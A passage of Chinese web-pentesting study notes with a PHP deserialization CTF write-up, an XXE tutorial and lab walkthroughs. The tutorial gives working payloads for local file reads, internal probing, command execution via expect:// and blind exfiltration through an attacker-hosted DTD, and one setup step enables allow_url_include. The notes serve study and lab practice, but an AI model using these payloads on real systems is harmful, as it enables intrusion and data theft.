<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp1.png" alt="PHP有类魔术方法触发-wp1"></p>
<p>2.定义了一个<code>FileHandler</code>类，有三个<code>protected属性</code>，并且还有<code>魔术方法</code>和自定义方法</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp2.png" alt="PHP有类魔术方法触发-wp2"></p>
<p>3.类结束了有个if语句，这是关键。里面使用到了<code>unserialize()</code>，考点大概率就是反序列化</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp3.png" alt="PHP有类魔术方法触发-wp3"></p>
<p>4.执行顺序，由GET传参给<code>$str</code>，然后进行反序列化传给<code>$obj</code>，相当于<code>$obj</code>现在是一个对象，当程序结束，会自动调用<code>$obj</code>对象中的析构方法<code>__destruct()</code>。<code>__destruct()</code>中会调用<code>$obj</code>的<code>process()</code>方法，该方法中的if语句有三条路，当<code>protected属性op==&quot;1&quot;</code>时会执行<code>write()</code>方法，当<code>protected属性op==&quot;2&quot;</code>时会执行<code>read()</code>方法，最后若都不满足上述两个便会执行<code>output()</code>方法输出<code>Bad Hacker!</code></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp4.png" alt="PHP有类魔术方法触发-wp4"></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp5.png" alt="PHP有类魔术方法触发-wp5"></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp6.png" alt="PHP有类魔术方法触发-wp6"></p>
<p>5.选择执行<code>write()</code>还是<code>read()</code>，有第1步分析可得，应该走<code>read()</code>因为包含了flag大概率会在<code>flag.php</code>文件中，然后去看<code>read()</code>方法我们发现我们还需要用到一个<code>protected属性filename</code>，因为我们要去读<code>flag.php</code>得把这个值传进去</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp7.png" alt="PHP有类魔术方法触发-wp7"></p>
<p>6.明确目标任务，GET传入一段序列化字符串满足<code>FileHandler</code>类的定义，并且让<code>$op == &quot;2&quot;</code>和<code>$filename == &quot;flag.php&quot;</code></p>
<p>注意，这里还有两个考点</p>
<p>7.一是在最开始执行<code>__destruct()</code>方法时，若<code>$op===&quot;2&quot;</code>则会重新赋值令<code>$op</code>的值为”1”，这使得我们没办法直接去调用<code>read()</code>方法，这里也印证了我们之前的猜测，要获取flag应当执行<code>read()</code>方法而非<code>write()</code>方法。</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp8.png" alt="PHP有类魔术方法触发-wp8"></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp9.png" alt="PHP有类魔术方法触发-wp9"></p>
<p>其实也很好绕过，在<code>__destruct()</code>方法中使用的是<code>===</code>强等于，而<code>read()</code>方法中使用的是<code>==</code>弱等于，我们只需要令<code>$op = &quot; 2&quot; 或 $op = 2</code>，就能绕过限制。</p>
<p>8.另一个考点是自定义方法<code>is_valid()</code>的绕过，该方法规定字符的ASCII码必须是32-125，而<code>FileHandler</code>类中的属性是<code>protected</code>在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求，会返回false。</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp10.png" alt="PHP有类魔术方法触发-wp10"></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp11.png" alt="PHP有类魔术方法触发-wp11"></p>
<p>绕过方法:</p>
<p>①PHP7.1以上(不包含7.1)版本对属性类型不敏感，<code>public</code>属性序列化不会出现不可见字符，可以用<code>public</code>属性来绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;1ceC0la&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1ceC0la&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>②<code>protected</code>属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p>
<p>用在线工具得到payload，用S替换s，用\00替换<code>*</code>两侧不可见字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span> = <span class="string">&quot;1ceC0la&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改后的payload:</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1ceC0la&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<p>9.最后访问<code>http://192.168.101.155/PHPseri.php/?str=payload</code>，再右键查看源码得到flag</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp12.png" alt="PHP有类魔术方法触发-wp12"></p>
<p>其他：</p>
<p>做这个题，在本地kali用phpstudy搭环境时遇到了个小问题，在使用<code>file_get_contents()</code>去读文件时，发现报错<code>file_get_contents(flag.php): failed to open stream: No such file or directory in /www/admin/localhost_80/wwwroot/PHPseri.php on line 48</code>，百度后，需要修改php.ini</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = Off</span><br><span class="line">allow_url_include = Off</span><br><span class="line"></span><br><span class="line">改成</span><br><span class="line"></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">之后重启虚拟机就好了</span><br></pre></td></tr></table></figure>

<h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://tool.lu/coderunner/">代码在线运行 - 在线工具 (tool.lu)</a></p>
<p><a href="http://www.dooccn.com/php/">php代码在线测试,php在线执行 (dooccn.com)</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=36">【小迪安全】WEB漏洞-反序列化之PHP </a></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">CTF PHP反序列化 - MustaphaMond - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.serialize">PHP: 魔术方法 - Manual</a></p>
<p><a href="https://www.php.net/manual/zh/language.oop5.overloading.php">PHP: 重载 - Manual</a></p>
<p><a href="https://blog.csdn.net/weixin_35304361/article/details/116533277?utm_term=%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96wp&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116533277&spm=3001.4430"><em>网鼎杯2020</em>php<em>反序列化</em>,<em>网鼎杯2020</em>[青龙组]–AreUSerialz</a></p>
<h2 id="Java-挖坑，以后填"><a href="#Java-挖坑，以后填" class="headerlink" title="Java(挖坑，以后填)"></a>Java(挖坑，以后填)</h2><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="Java反序列化"></p>
<h3 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h3><h4 id="Releases-·-WebGoat-WebGoat-github-com"><a href="#Releases-·-WebGoat-WebGoat-github-com" class="headerlink" title="Releases · WebGoat/WebGoat (github.com)"></a><a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat/WebGoat (github.com)</a></h4><h4 id="CTFHub中的think-java题目"><a href="#CTFHub中的think-java题目" class="headerlink" title="CTFHub中的think_java题目"></a><a href="https://www.ctfhub.com/#/challenge">CTFHub</a>中的<code>think_java</code>题目</h4><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>反序列化工具<code>ysoserial</code>：<a href="https://github.com/frohoff/ysoserial/releases">Releases · frohoff/ysoserial (github.com)</a></p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=37">【小迪安全】WEB漏洞-反序列化之Java </a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE&amp;XML</title>
    <url>/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/</url>
    <content><![CDATA[<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE&XML.png" alt="XXE&amp;XML"></p>
<span id="more"></span>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明，DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML份里，是独立于软件和硬件的信息传输工具。</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称XML  External Entity Injection，即<strong>xml外部实体注入</strong>漏洞，XXE漏洞发生在<strong>应用程序解析XML</strong>输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载而已外部文件，造成<strong>文件读取</strong>、命令执行、<strong>内网端口扫描</strong>、攻击内网网站等危害。</p>
<h2 id="XML与HTML的主要差异"><a href="#XML与HTML的主要差异" class="headerlink" title="XML与HTML的主要差异"></a>XML与HTML的主要差异</h2><p>XML被设计为传输和存储数据，其焦点是数据内容</p>
<p>HTML被设计用来显示数据，其焦点是数据外观</p>
<p>XML旨在传输信息，而HTML旨在显示信息</p>
<h2 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个<code>&lt;x&gt;&lt;/x&gt;</code>之间执行xxe实体</p>
<h3 id="内网探针或攻击内网应用（出发漏洞地址）"><a href="#内网探针或攻击内网应用（出发漏洞地址）" class="headerlink" title="内网探针或攻击内网应用（出发漏洞地址）"></a>内网探针或攻击内网应用（出发漏洞地址）</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.0.103:8081/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的ip地址<code>192.168.0.103</code>是内网地址</p>
<p>访问没有报错说明<code>index.php</code>文件存在，同时也说明8080端口开放</p>
<p>对端口探针的话需要用其他协议</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>该CASE是在expect扩展的PHP环境里执行系统命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h3><p>类似于远程文件包含 ，相当于是在自己的服务器上放上一个包含恶意xml语句的evil2.dtd文件，然后让服务器去访问，服务器便会执行dtd文件里的代码</p>
<p>条件：对方服务器未禁止外部实体引用 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx:8081/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%fule;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="无回现-读文件"><a href="#无回现-读文件" class="headerlink" title="无回现-读文件"></a>无回现-读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.xxx.xxx:8081/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEN &#x27;http://192.168.xxx.xxx:8081/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>

<p>过程：由于没有回显，所以我们读取的文件内容无法显示出来。这里我们先用file（经过base64加密）把文件内容读出来，然后再去访问远程地址（自己的服务器）上的一个dtd文件，这个dtd里访问自己服务器上的文件并且使用了file作为参数，完成这一代码后，我们便可读取自己服务器的日志文件，查看解密参数，便得到文件内容（还可以在自己服务器上写一个参数来接收这个值，<code>http://192.168.xxx.xxx:8081/xxe.php?data=%file;</code>这里data接收了文件内容）</p>
<h3 id="协议-读文件（绕过）"><a href="#协议-读文件（绕过）" class="headerlink" title="协议-读文件（绕过）"></a>协议-读文件（绕过）</h3><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE-绕过</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="xxe-lab-php靶场登录框xml数据传输"><a href="#xxe-lab-php靶场登录框xml数据传输" class="headerlink" title="xxe-lab-php靶场登录框xml数据传输"></a>xxe-lab-php靶场登录框xml数据传输</h3><p>地址：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>首先是用burp抓取数据包，然后右键<code>Send to Spider</code>，进行爬取</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp1.png" alt="xxe-lab-php-wp1"></p>
<p>在<code>History</code>中可以看到爬取结果</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp2.png" alt="xxe-lab-php-wp2"></p>
<p>然后对爬取内容搜索<code>xml</code>关键字</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp3.png" alt="xxe-lab-php-wp3"></p>
<p>找到可以提交xml的页面</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp4.png" alt="xxe-lab-php-wp4"></p>
<p>再将数据包发送到Repeater构造恶意xml代码进行攻击</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp5.png" alt="xxe-lab-php-wp5"></p>
<h3 id="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"><a href="#CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改" class="headerlink" title="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"></a>CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改</h3><p>地址：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
<h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>先用burp抓包</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp1.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp1"></p>
<p>再更改数据请求格式Content-Type的值为application/xml<br>然后POST提交下面的代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现flag可疑目录，flag应该在<code>/home/ctf/</code>下</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp2.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp2"></p>
<p>于是修改payload，得到flag值</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp3.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp3"></p>
<h3 id="vulnhub-xxe-lab-1"><a href="#vulnhub-xxe-lab-1" class="headerlink" title="vulnhub-xxe lab:1"></a>vulnhub-xxe lab:1</h3><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1</a></p>
<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>先用nmap进行扫描</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp1.png" alt="vulnhub-xxe lab1-wp1"></p>
<p>结果如下：</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp2.png" alt="vulnhub-xxe lab1-wp2"></p>
<p>访问后没发现什么，然后用扫描器去扫，发现有robots.txt文件可以访问，并且得到两个有效信息，<code>/xxe/</code>目录和<code>/admin.php</code>文件</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp3.png" alt="vulnhub-xxe lab1-wp3"></p>
<p>先访问<code>/xxe/</code>，登录抓包，发现发送的是xml格式数据</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp4.png" alt="vulnhub-xxe lab1-wp4"></p>
<p>将数据包发往<code>Repeater</code>，构造攻击语句发包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示<code>xxe.php</code>base64加密后内容</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp5.png" alt="vulnhub-xxe lab1-wp5"></p>
<p>发送到burp的<code>Send to Decoder</code>去解密</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp6.png" alt="vulnhub-xxe lab1-wp6"></p>
<p>解密得到，但并没有发现什么有用信息</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp7.png" alt="vulnhub-xxe lab1-wp7"></p>
<p>想到之前还有一个<code>admin.php</code>文件，于是用payload去读取<code>admin.php</code>，进行相同操作，得到用户名和密码，密码是md5加密的</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：administhebest</span><br><span class="line">密码：<span class="symbol">admin@</span><span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>这里登录点要注意，是<code>admin.php</code>文件，我们应访问<code>/xxe/admin.php</code>，登进去后点击Flag</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp8.png" alt="vulnhub-xxe lab1-wp8"></p>
<p>进去后跳转如下地址</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp9.png" alt="vulnhub-xxe lab1-wp9"></p>
<p>说明有限制，我们接着用刚才的xxe漏洞去读这个文件<code>flagmeout.php</code></p>
<p>注意该文件是在站点根部录下<code>./flagmeout.php</code></p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp10.png" alt="vulnhub-xxe lab1-wp10"></p>
<p>解密后得到，这里是base32加密</p>
